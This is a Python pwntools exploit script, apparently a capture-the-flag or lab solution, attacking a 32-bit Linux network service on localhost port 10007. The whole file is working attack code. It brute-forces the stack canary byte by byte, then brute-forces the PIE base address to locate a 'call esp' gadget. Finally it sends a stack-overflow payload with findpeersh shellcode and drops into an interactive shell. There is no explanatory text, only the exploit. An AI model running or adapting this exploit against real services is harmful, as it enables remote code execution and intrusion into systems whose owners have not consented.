#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep

context(arch="i386", os="linux")
getLogger('pwnlib.tubes').setLevel('WARNING')

POSSIBLE_LOAD = 0x565fe000
CALL_ESP_OFFSET = 0x00000e0e
PIE_ASLR_MASK = 0x003ff000
LOAD_LOW = POSSIBLE_LOAD & ~PIE_ASLR_MASK
LOAD_HIGH = POSSIBLE_LOAD | PIE_ASLR_MASK
SHELLCODE = asm(shellcraft.findpeersh())
CANARY_OFFSET = 320
RET_OFFSET = 336

def brute_canary():
    canary = b''
    pcanary = log.progress('Canary')
    while len(canary) < 4:
        for c in range(256):
            full = canary + bytes([c])
            pcanary.status('0x{:08x}'.format(u32(full + bytes([0] * (4 - len(full))))))
            r = remote('localhost', 10007)
            r.send(flat(-1, fit({ CANARY_OFFSET: full })))
            if b'Goodbye.' in r.recvall():
                canary = full
                break
    pcanary.success('0x%x', u32(canary))
    return canary

def brute_call_esp():
    pcall = log.progress('call esp')
    for load in range(LOAD_LOW, LOAD_HIGH + 1, 0x1000):
        call_esp = load + CALL_ESP_OFFSET
        pcall.status('0x{:08x}'.format(call_esp))
        try:
            r = remote('localhost', 10007)
            r.send(flat(-1, fit({CANARY_OFFSET: CANARY, RET_OFFSET: call_esp}, SHELLCODE)))
            sleep(.1)
            r.sendline('echo blar && exit')
            if b'blar' in r.recvall():
                pcall.success('0x{:08x}'.format(call_esp))
                return call_esp
        except:
            pass

    pcall.failure('0x{:08x}'.format(call_esp))

splash()
CANARY = brute_canary()
CALL_ESP = brute_call_esp()

r = remote('localhost', 10007)
r.send(flat(-1, fit({
    CANARY_OFFSET: CANARY,
    RET_OFFSET: flat(CALL_ESP, SHELLCODE)
})))
r.interactive()
